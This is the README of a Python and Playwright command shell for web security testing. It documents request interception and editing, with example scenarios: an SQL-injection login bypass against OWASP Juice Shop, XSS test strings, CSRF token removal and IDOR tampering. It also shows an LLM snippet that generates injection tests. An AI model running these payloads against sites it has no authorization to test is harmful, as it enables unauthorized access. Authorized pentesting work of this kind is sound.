<div>

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![Playwright](https://img.shields.io/badge/Playwright-Async-green.svg)](https://playwright.dev/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-Pentesting-red.svg)]()
[![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()

### 🕵️ Интерактивная оболочка для тестирования безопасности веб-приложений

**Навигация • Инспекция • Перехват • Эксплуатация • Анализ**

[Возможности](#-возможности) • [Установка](#-установка) • [Быстрый старт](#-быстрый-старт) • [Команды](#-команды) • [Примеры](#-примеры-использования) • [API](#-api)

</div>

---

## 📖 О проекте

**Playwright Security Shell** — это интерактивная командная оболочка для автоматизированного тестирования безопасности веб-приложений. Объединяет мощь Playwright с удобством CLI для пентестинга, исследования уязвимостей и анализа веб-трафика.

```
┌─────────────────────────────────────────────────────────────────┐
│  🎯 НАЗНАЧЕНИЕ                                                  │
├─────────────────────────────────────────────────────────────────┤
│  • Автоматизация рутинных задач пентестера                      │
│  • Перехват и модификация HTTP-запросов в реальном времени      │
│  • Анализ DOM-структуры и поиск уязвимых элементов              │
│  • Тестирование на SQLi, XSS, IDOR, CSRF и другие уязвимости    │
│  • Полностью локальное выполнение (без отправки данных)         │
└─────────────────────────────────────────────────────────────────┘
```

> ⚠️ **ВАЖНО:** Используйте только на авторизованных системах и тестовых средах. Авторы не несут ответственности за неправомерное использование.

---

## ✨ Возможности

### 🔍 Исследование и навигация
| Функция | Описание |
|---------|----------|
| `browser` | Запуск браузера с настройками безопасности |
| `goto` | Переход по URL с ожиданием загрузки |
| `click` | Умный клик по селектору или тексту |
| `fill` / `press` | Заполнение форм и отправка клавиш |
| `outlinetree` | Визуализация DOM-дерева с фильтрами |
| `forms` / `inputs` | Быстрый поиск всех форм и полей |

### 🕵️ Перехват трафика (Burp-style)
| Функция | Описание |
|---------|----------|
| `inspecton` | Включить перехват запросов с фильтрами |
| `inspectlist` | Показать очередь перехваченных запросов |
| `inspectshow` | Детальный просмотр запроса (headers, body) |
| `inspectedit` | Модификация JSON/Form/Headers перед отправкой |
| `inspectskip` | Отправить запрос (как есть или с изменениями) |
| `inspectabort` | Отменить запрос (не отправлять на сервер) |
| `inspectexport` | Экспорт запросов в JSON для анализа |

### 🎯 Тестирование уязвимостей
| Уязвимость | Команды |
|------------|---------|
| **SQL Injection** | `inspectedit --json "email=admin' or 1=1 --"` |
| **XSS** | `fill #search "<script>alert(1)</script>"` |
| **IDOR** | `inspectedit --json "id=123"` (манипуляция ID) |
| **CSRF** | `inspectedit --del "csrf_token"` |
| **Header Injection** | `inspectedit --header "X-Custom: payload"` |

### 📊 Анализ и отчётность
| Функция | Описание |
|---------|----------|
| `screenshot` / `fullscreenshot` | Скриншот страницы или всей прокрутки |
| `text` / `html` | Извлечение текста или HTML элемента |
| `analyze` | Детальная диагностика элемента |
| `links` / `images` | Список всех ссылок и изображений |
| `inspectstatus` | Статистика перехваченных запросов |

---

## 🚀 Установка

### Требования
- Python 3.8+
- pip
- 2GB свободного места (для браузеров Playwright)

### Быстрая установка

```bash
# 1. Клонируйте репозиторий
git clone https://github.com/miomit/playwright-security-shell.git
cd playwright-security-shell

# 2. Создайте виртуальное окружение
python -m venv venv

# 3. Активируйте окружение
# Linux/Mac:
source venv/bin/activate
# Windows:
venv\Scripts\activate

# 4. Установите зависимости
pip install -r requirements.txt

# 5. Установите браузеры Playwright
playwright install chromium
# playwright install firefox  # Опционально
# playwright install webkit   # Опционально

# 6. Запустите оболочку
python playwright.py
```

### Файл requirements.txt
```txt
playwright>=1.40.0
asyncio
shlex
json
datetime
```

---

## 🎯 Быстрый старт

### Запуск оболочки
```bash
python playwright.py
```

### Первая сессия (5 команд)
```
playwright> browser
playwright> goto https://juice-shop.herokuapp.com
playwright> click Dismiss
playwright> forms
playwright> outlinetree --depth 4 --text
```

### Тест SQL-инъекции за 60 секунд
```
playwright> browser
playwright> goto https://juice-shop.herokuapp.com
playwright> click Dismiss
playwright> click Account
playwright> click Login
playwright> inspecton --url /rest/user/login --method POST
playwright> fill #email admin
playwright> fill #password anything
playwright> click "Log in"
playwright> inspectedit req_0 --json "email=admin' or 1=1 --"
playwright> inspectskip req_0
playwright> screenshot admin_login.png
playwright> inspectoff
```

---

## 📚 Команды

### Навигация
| Команда | Алиасы | Описание | Пример |
|---------|--------|----------|--------|
| `browser` | `br`, `launch` | Запустить браузер | `browser` |
| `goto` | `go`, `navigate` | Перейти по URL | `goto https://site.com` |
| `click` | `press`, `tap` | Клик по элементу | `click #btn` / `click Login` |
| `fill` | `input`, `type` | Заполнить поле | `fill #email test@test.com` |
| `press` | `key`, `type` | Нажать клавишу | `press #s Enter` |
| `wait` | `sleep` | Ожидание в мс | `wait 2000` |

### Инспекция
| Команда | Алиасы | Описание | Пример |
|---------|--------|----------|--------|
| `outlinetree` | `domtree`, `ot` | DOM-дерево страницы | `outlinetree --depth 5 --text` |
| `forms` | `form` | Все формы на странице | `forms` |
| `inputs` | `fields` | Все инпуты и кнопки | `inputs --type email` |
| `links` | `hrefs` | Все ссылки | `links --external` |
| `images` | `img` | Все изображения | `images` |
| `analyze` | `inspect` | Детали элемента | `analyze #loginBtn` |

### Перехват трафика
| Команда | Алиасы | Описание | Пример |
|---------|--------|----------|--------|
| `inspecton` | `intercepton` | Включить перехват | `inspecton --url /api --method POST` |
| `inspectoff` | `interceptoff` | Выключить перехват | `inspectoff` |
| `inspectlist` | `inspectls` | Список запросов | `inspectlist --history` |
| `inspectshow` | `showreq` | Детали запроса | `inspectshow req_0` |
| `inspectedit` | `editreq` | Редактировать запрос | `inspectedit req_0 --json "field=value"` |
| `inspectskip` | `skipreq` | Отправить запрос | `inspectskip req_0` |
| `inspectabort` | `abortreq` | Отменить запрос | `inspectabort req_0` |
| `inspectexport` | `exportreq` | Экспорт в JSON | `inspectexport dump.json` |
| `inspectstatus` | `stat` | Статус инспектора | `inspectstatus` |

### Утилиты
| Команда | Алиасы | Описание | Пример |
|---------|--------|----------|--------|
| `screenshot` | `ss`, `pic` | Скриншот | `screenshot page.png` |
| `fullscreenshot` | `fullss` | Скриншот всей страницы | `fullscreenshot full.png` |
| `text` | `gettext` | Текст элемента | `text body` |
| `html` | `source` | HTML элемента | `html #main` |
| `runscript` | `script` | Выполнить скрипт | `runscript test.txt` |
| `help` | `?`, `h` | Справка | `help click` |
| `exit` | `quit`, `q` | Выход | `exit` |

---

## 🎨 Примеры использования

### 🔐 SQL-инъекция (Login Bypass)
```bash
# Сценарий: obypass.txt
browser
goto https://juice-shop.herokuapp.com
click Dismiss
click Account
click Login
inspecton --url /rest/user/login --method POST
fill #email admin
fill #password anything
click "Log in"
inspectedit req_0 --json "email=admin' or 1=1 --"
inspectskip req_0
wait 2000
screenshot sqli_success.png
inspectoff
```

```bash
# Запуск
playwright> runscript sqli.txt
```

### 🕵️ XSS-тестирование
```bash
playwright> browser
playwright> goto https://test-site.com
playwright> inputs --type text
playwright> inspecton --method POST
playwright> fill #search "<img src=x onerror=alert(1)>"
playwright> click Search
playwright> wait 2000
playwright> text body
playwright> screenshot xss_test.png
```

### 📊 Анализ API endpoints
```bash
playwright> browser
playwright> goto https://api-site.com
playwright> inspecton --url /api
playwright> click "Get Started"
playwright> fill #email test@test.com
playwright> click "Submit"
playwright> click "Dashboard"
playwright> inspectlist --history
playwright> inspectexport api_endpoints.json
playwright> inspectoff
```

### 🌳 Исследование структуры сайта
```bash
playwright> browser
playwright> goto https://target-site.com
playwright> outlinetree --depth 5 --text --links
playwright> forms
playwright> links --external
playwright> fullscreenshot overview.png
```
---

## 🧠 Интеграция с LLM

### Использование с локальной моделью (Ollama)
```python
# examples/llm_agent.py
import requests

def ask_llm(prompt):
    response = requests.post(
        "http://localhost:11434/api/generate",
        json={"model": "qwen2.5-coder", "prompt": prompt}
    )
    return response.json()["response"]

# Генерация команд через LLM
task = "Найди форму логина и протестируй на SQL-инъекцию"
commands = ask_llm(f"Сгенерируй команды playwright shell для: {task}")
print(commands)
```

### Датасет для дообучения (TODO)
В репозитории включён `dataset/dataset.jsonl` с примерами для fine-tuning моделей под задачи безопасности.

---

## ⚠️ Безопасность и этика

```
┌─────────────────────────────────────────────────────────────────┐
│  ⚠️  ЮРИДИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Этот инструмент предназначен ТОЛЬКО для:                       │
│  • Тестирования собственных систем                              │
│  • Работы в рамках официального пентест-контракта               │
│  • Образовательных целей в контролируемой среде                 │
│  • CTF-соревнований и легальных баг-баунти программ             │
│                                                                 │
│  ЗАПРЕЩЕНО ИСПОЛЬЗОВАНИЕ ДЛЯ:                                   │
│  • Несанкционированного доступа к чужим системам                │
│  • Нарушения законов о кибербезопасности                        │
│  • Любых действий без письменного разрешения владельца          │
│                                                                 │
│  Авторы не несут ответственности за неправомерное использование │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📝 Лицензия

MIT License — см. файл [LICENSE](LICENSE) для деталей.

---

## 🙏 Благодарности

- [Playwright](https://playwright.dev/) — основа автоматизации браузера
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) — тестовый полигон
- [Burp Suite](https://portswigger.net/burp) — вдохновение для инспектора

---

## 🏷️ Keywords

`pentesting` `security` `playwright` `web-security` `sql-injection` `xss` `burp-suite` `automation` `python` `cybersecurity` `vulnerability-scanner` `http-intercept` `web-testing`
